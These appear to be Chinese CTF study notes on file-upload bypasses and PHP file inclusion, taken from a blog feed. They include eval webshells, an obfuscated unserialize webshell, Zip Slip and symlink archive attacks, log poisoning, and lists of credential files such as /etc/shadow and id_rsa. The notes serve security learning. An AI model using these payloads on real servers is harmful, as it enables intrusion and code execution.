&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>用法  php exp.php 1.png<br>注意，要先上传渲染一次再进行脚本渲染<br>我在本地环境试了好多张jpg图片，包括系统截图的，qq截图，网上下载图片等等方式，都没有成功<br>不过国光师傅提供的这张图片倒是可以使用，不知道是啥问题<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj16.jpg"><br>国光师傅的jpg总结<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj17.jpg"></p>
<h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><p>从.user.ini后补充一下靶场中没有提到的环境</p>
<p>使用条件:<br>对应目录下面有可执行的php文件</p>
<p>.user.ini.它比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。</p>
<p>如果采用exif_imagetype()验证文件后缀，可以尝试上传.user.ini</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>使用任意一条即可，这两个配置项相当于文件包含 require()<br>auto_prepend_file = &lt;filename&gt; <span class="hljs-regexp">//</span> 包含在文件头<br>auto_append_file = &lt;filename&gt; <span class="hljs-regexp">//</span> 包含在文件尾（遇到<span class="hljs-keyword">exit</span>语句失效）<br></code></pre></td></tr></table></figure>
<p>如果成功上传了.user.ini后直接上传图片马getshell即可</p>
<p>trick1：<code>auto_append_file</code>也支持伪协议的使用，例如<code>auto_append_file = php://input</code><br>trick2：可以包含nginx日志，例如<code>auto_append_file = /var/log/nginx/access.log</code>，访问的时候在ua头写上一句话木马</p>
<h1 id="内容检测"><a href="#内容检测" class="headerlink" title="内容检测"></a>内容检测</h1><p>可以使用二分法来确定被检测的关键字</p>
<p>第一种情况：检测php的关键标签，比如<code>&lt;?php ?&gt;</code><br>可以尝试使用其他标签，如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">2333</span>]);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>使用script标签对php版本有要求：<code>php &lt; 7</code></p>
<p>或者使用短标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure>


<p>第二种情况：检测危险函数等敏感内容<br>可以使用免杀马等</p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>])) &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HandShip</span> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$male</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$allin</span> = <span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-variable">$allin</span>(<span class="hljs-variable language_">$this</span>-&gt;male);<br>     &#125;<br>  &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])==<span class="hljs-string">&#x27;ce61649168c4550c2f7acab92354dc6e&#x27;</span>)&#123;<br><br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>]);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>使用方法<code>run=O:8:&quot;HandShip&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:4:&quot;male&quot;;s:9:&quot;cat /home&quot;;&#125;;&amp;code=panda</code></p>
<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><p>非常简单的一个漏洞<br>Apache默认一个文件可以有多个以点.分割的后缀，当右边的后缀无法识别，则继续向左识别<br>上传<code>shell.php.asd</code><br>asd这个后缀无法解析，服务器就会认为后缀是.php，从而绕过</p>
<h1 id="iis-asp目录解析漏洞"><a href="#iis-asp目录解析漏洞" class="headerlink" title="iis asp目录解析漏洞"></a>iis asp目录解析漏洞</h1><p>该解析漏洞形成原因是以*.asp命名的文件夹里面的文件都会被当作asp文件解析！</p>
<h1 id="iis-分号漏洞"><a href="#iis-分号漏洞" class="headerlink" title="iis 分号漏洞"></a>iis 分号漏洞</h1><p>*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</p>
<h1 id="nginx错误配置漏洞"><a href="#nginx错误配置漏洞" class="headerlink" title="nginx错误配置漏洞"></a>nginx错误配置漏洞</h1><p><em>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</em></p>
<p>1：由于<code>nginx.conf</code>的错误配置导致<code>nginx</code>把以<code>.php</code>结尾的文件交给<code>fastcgi</code>处理，为此可以构造<code>upload/1.png/1.php</code>（1.png是上传的文件，包含一句话木马）</p>
<p>2：但是<code>fastcgi</code>在处理<code>1.php</code>文件时发现文件并不存在，这时<code>php.ini</code>配置文件中<code>cgi.fix_pathinfo=1</code>发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由<code>fastcgi</code>处理的文件就变成了<code>/1.png</code>，最后将<code>1.png</code>的内容当成php解析</p>
<h1 id="超大文件名绕过"><a href="#超大文件名绕过" class="headerlink" title="超大文件名绕过"></a>超大文件名绕过</h1><p>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”1.a.a.a.不要忽略我的长度.a.jsp</p>
<h1 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="DATA绕过"></a>DATA绕过</h1><p>没有对后缀名中的<code>::$DATA</code>进行过滤。在php+windows的情况下：如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持<code>::$DATA</code>之前的文件名。利用windows特性，可在后缀名中加<code>::$DATA</code>绕过</p>
<h1 id="常见后缀"><a href="#常见后缀" class="headerlink" title="常见后缀"></a>常见后缀</h1><figure class="highlight clojure"><table><tr><td class="code"><pre><code class="hljs clojure">(<span class="hljs-string">&quot;.php&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.phtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pht&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ascx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ashx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aScx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aShx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cEr&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.sWf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.swf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htaccess&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ini&quot;</span>)<br></code></pre></td></tr></table></figure>

<h1 id="getimagesize函数绕过"><a href="#getimagesize函数绕过" class="headerlink" title="getimagesize函数绕过"></a>getimagesize函数绕过</h1><p>当在代码中使用<code>getimagesize</code>函数来检测是不是图片，而不采取其他措施的情况下，可以在文件头加上如下内容(XBM格式图片)来绕过检测</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">#define width 100;<br>#define height 100;<br></code></pre></td></tr></table></figure>

<h1 id="Zip-Slip"><a href="#Zip-Slip" class="headerlink" title="Zip Slip"></a>Zip Slip</h1><p>上传zip类型的文件后，应用程序自动进行解压，就有可能存在<code>zip slip</code>漏洞</p>
<p>使用python生成或者010等工具手动编辑路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-comment"># the name of the zip file to generate</span><br>zf = zipfile.ZipFile(<span class="hljs-string">&#x27;out.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span><br>fname = <span class="hljs-string">&#x27;sec_test.txt&#x27;</span><br><span class="hljs-comment">#destination path of the file</span><br>zf.write(fname, <span class="hljs-string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>unzip命令是无法实现目录穿越的，会默认跳过..&#x2F;</p>
</blockquote>
<p><a href="https://github.com/snyk/zip-slip-vulnerability">所有已发现受Zip Slip影响的项目</a></p>
<h1 id="zip软连接"><a href="#zip软连接" class="headerlink" title="zip软连接"></a>zip软连接</h1><p>当解压操作可以覆盖上一次解压文件时触发</p>
<p>例如ciscn2023-unzip</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure>


<p><code>unzip</code>的<code>-o</code>参数表示 不必先询问用户，unzip执行后覆盖原有的文件</p>
<p><strong>构造第一个压缩包</strong></p>
<p>先构造一个指向<code>/var/www/html</code>的软连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /var/www/html poc<br></code></pre></td></tr></table></figure>

<p>再保留软连接压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">zip --symlinks test.zip poc<br></code></pre></td></tr></table></figure>

<p>此时上传该<code>test.zip</code>解压出里边的文件，也就是软连接到<code>/var/www/html</code></p>
<p><strong>构造第二个压缩包</strong></p>
<p>先创建跟第一个压缩包中目录同名的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> poc<br></code></pre></td></tr></table></figure>

<p>接着向目录中写一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br></code></pre></td></tr></table></figure>

<p>压缩这个目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">zip -r test1.zip poc<br></code></pre></td></tr></table></figure>

<p>当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png"></p>
<h1 id="tar解压目录穿越"><a href="#tar解压目录穿越" class="headerlink" title="tar解压目录穿越"></a>tar解压目录穿越</h1><p>tar命令可以在打包的时候把路径也打包进去</p>
<p><code>tar cPvf test.tar ../../../../../var/www/html/upload/payload.php</code></p>
<blockquote>
<p>Linux下解压(使用的是GNU的tar)，默认情况下，tar会自动把前面的&#x2F;去掉，然后在当前目录解压<br>Unix则不然，会依照绝对路径解压，对路径中的其他文件不影响，对相同的文件，覆盖。如果不存在某个目录，则创建(如果有权限)。<br>在这里 python的解压 与Unix的解压同理，会直接在指定路径下进行解压</p>
</blockquote>
<h1 id="phar-x2F-x2F-amp-zip-x2F-x2F"><a href="#phar-x2F-x2F-amp-zip-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F;</h1><p><code>http://localhost/?url=phar://uploads/63e93ffe53f03e93bb0a0249152d243874e31c9b.zip/shell</code><br><code>http://localhost/?url=zip:///var/www/html/upload/892e38cea0c47c744ecc60ccacc94c23.zip%23shell</code></p>
<h1 id="利用中间件差异绕过waf"><a href="#利用中间件差异绕过waf" class="headerlink" title="利用中间件差异绕过waf"></a>利用中间件差异绕过waf</h1><p>来自西湖论剑的一道题目：扭转乾坤</p>
<p>上传发现提示的<code>apache</code>不支持<code>Content-Type: multipart/form-data</code></p>
<p>后端为<code>tomcat</code>，<code>tomcat</code>对于包解析并不是严格按照<code>RFC</code>中的标准，对一些异常的<code>header</code>头内容也会兼容</p>
<p>包括但不限于，修改为<code>Content-Type</code>为<code>multipart//form-data;</code>｜<code>大小写兼容</code>｜<code>multipart</code>｜<code>multipart/  form-data;</code></p>
<h1 id="判断上传漏洞类型"><a href="#判断上传漏洞类型" class="headerlink" title="判断上传漏洞类型"></a>判断上传漏洞类型</h1><p>借用<a href="https://gv7.me/">c0ny1</a>师傅的一个图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/sum_up.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件上传的基本姿势应该都提及了<br>欢迎补充和指正！</p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/solidity.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d7c4d4332871232fd43862ee2305efcae517aa5d375b74dcab5538981e968662"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>solidity</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含总结</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h1><p>主要四个可利用函数：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">include： 找不到被包含的文件时只会产生警告，脚本将继续执行。<br>include_once： 和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require： 找不到被包含的文件时会产生致命错误，并停止脚本。<br>require_once： 和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br></code></pre></td></tr></table></figure>

<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。<br>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p>
<h2 id="读敏感文件"><a href="#读敏感文件" class="headerlink" title="读敏感文件"></a>读敏感文件</h2><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Windows：<br>    C:\boot.ini                                           //查看系统版本<br>    C:\Windows\System32\inetsrv\MetaBase.xml              //IIS配置文件<br>    C:\Windows\repair\sam                                 //存储系统初次安装的密码<br>    C:\Program Files\mysql\my.ini                         //Mysql配置<br>    C:\Program Files\mysql\data\mysql\user.MYD            //Mysql root<br>    C:\Windows\php.ini                                    //php配置信息<br>    C:\Windows\my.ini                                     //Mysql配置信息<br>    ...<br>Linux：<br>    /root/.ssh/authorized_keys<br>    /root/.ssh/id_rsa<br>    /root/.ssh/id_ras.keystore<br>    /root/.ssh/known_hosts<br>    /etc/passwd<br>    /etc/shadow<br>    /etc/my.cnf<br>    /etc/httpd/conf/httpd.conf<br>    /root/.bash_history<br>    /root/.mysql_history<br>    /proc/self/fd/fd[0-9]*(文件标识符)<br>    /proc/mounts<br>    /porc/config.gz<br></code></pre></td></tr></table></figure>


<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p><a href="https://www.php.net/manual/zh/wrappers.php">官网伪协议手册</a></p>
<h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><code>file://</code>用于访问本地文件系统</p>
<p>使用条件：<code>allow_url_fopen=On/Off、allow_url_include=On/Off</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-1.png" alt="example"></p>
<h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h3><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>使用条件：<code>allow_url_fopen=On/Off、allow_url_include=On/Off</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-2.png" alt="example"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-5.png"></p>
<h5 id="php-x2F-x2F-filter绕过死亡die"><a href="#php-x2F-x2F-filter绕过死亡die" class="headerlink" title="php:&#x2F;&#x2F;filter绕过死亡die"></a>php:&#x2F;&#x2F;filter绕过死亡die</h5><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>使用<code>rot13</code>等转换器进行编码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-6.png" alt="example"></p>
<h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>使用条件：<code>allow_url_fopen=On/Off、allow_url_include=On</code></p>
<p><code>enctype=&quot;multipart/form-data&quot;</code>(即文件上传)的时候<code>php://input</code>是无效的。</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-3.png" alt="example"></p>
<h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p>使用条件：<code>allow_url_include=On、allow_url_fopen=On</code></p>
<p>利用data:&#x2F;&#x2F;伪协议进行代码执行的思路原理和php:&#x2F;&#x2F;input是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。</p>
<p>用大白话解释就是说原来include包含的是一个路径，再去读取里面的内容，data:&#x2F;&#x2F;协议就相当于两步转为一步，直接读内容，可以理解为将include转为eval</p>
<p>用法：<code>data://text/plain;base64,</code></p>
<p>trick：符合<a href="http://www.faqs.org/rfcs/rfc2397.html">rfc2397</a>规范即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-7.png" alt="example"></p>
<h2 id="Nginx日志包含"><a href="#Nginx日志包含" class="headerlink" title="Nginx日志包含"></a>Nginx日志包含</h2><p>利用条件：<br>1：有文件名可控的文件包含点<br>2：有可以访问到的日志路径</p>
<p>linux下日志默认存储位置</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/var/log/nginx/access.log<br>/var/log/nginx/error_log<br></code></pre></td></tr></table></figure>

<p>在访问时修改<code>User-Agent</code>头为<code>php</code>代码，成功访问后会在日志中记录下来</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-8.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-9.png"></p>
<p>然后包含日志<code>?file=../../../../../var/log/nginx/access.log</code>，达到任意代码执行的效果</p>
<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2><p>在给<code>PHP</code>发送<code>POST</code>数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，<code>PHP</code>都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p>
<p>同时，因为<code>phpinfo</code>页面会将当前请求上下文中所有变量都打印出来，所以我们如果向<code>phpinfo</code>页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93-10.png"></p>
<p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p>
<p>但文件包含漏洞和<code>phpinfo</code>页面通常是两个页面，理论上我们需要先发送数据包给<code>phpinfo</code>页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行<code>getshell</code>。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
<p>这个时候就需要用到条件竞争，具体流程如下：</p>
